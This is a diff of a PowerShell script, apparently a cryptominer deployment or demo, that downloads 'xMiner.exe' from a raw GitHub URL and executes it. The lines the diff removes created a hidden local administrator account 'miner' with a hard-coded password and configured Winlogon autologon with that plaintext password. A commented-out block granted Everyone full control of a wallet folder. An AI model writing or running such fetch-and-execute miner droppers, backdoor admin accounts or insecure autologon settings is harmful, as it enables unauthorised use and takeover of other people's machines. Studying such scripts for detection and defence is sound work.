@@ -22,17 +22,9 @@ New-Item -Path "c:\wallet" -Name "mPdhgtHGHGrtdyt6erjh5kjhjhGGUjkduU.coin" -Item
 
 
 
-cmd.exe /c "net user miner Mining4Ever! /add"
-cmd.exe /c "net localgroup Administrators miner /add"
+
 
 Start-Transcript -Path "C:\transcript-xminer.txt" -NoClobber;
-
-$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-$DefaultUsername = "miner"
-$DefaultPassword = "Mining4Ever!"
-Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String 
-Set-ItemProperty $RegPath "DefaultUsername" -Value "$DefaultUsername" -type String 
-Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
 
 
 $miner = "https://raw.githubusercontent.com/tmmdemo/automate/master/xMiner.exe"
@@ -41,19 +33,20 @@ $web = New-Object -TypeName System.Net.WebClient
 $web.DownloadFile($miner,$DEST)
 
 
-$fld = "c:\wallet"
-$Acl = Get-ACL $fld
-$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule("everyone","FullControl","ContainerInherit,Objectinherit","none","Allow")
-$Acl.AddAccessRule($AccessRule)
-Set-Acl $fld $Acl
+#$fld = "c:\wallet"
+#$Acl = Get-ACL $fld
+#$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule("everyone","FullControl","ContainerInherit,Objectinherit","none","Allow")
+#$Acl.AddAccessRule($AccessRule)
+#Set-Acl $fld $Acl
 
 
-$username = 'miner'
-$password = 'Mining4Ever!'
+#$username = 'miner'
+#$password = 'Mining4Ever!'
 
-$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
-$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
-Start-Process -FilePath $DEST -WorkingDirectory "c:\wallet" -ArgumentList "-l -p 5150 -d"
+#$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+#$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+#Start-Process -FilePath $DEST -WorkingDirectory "c:\wallet" -ArgumentList "-l -p 5150 -d"
+& $DEST
 Stop-Transcript;
 
 
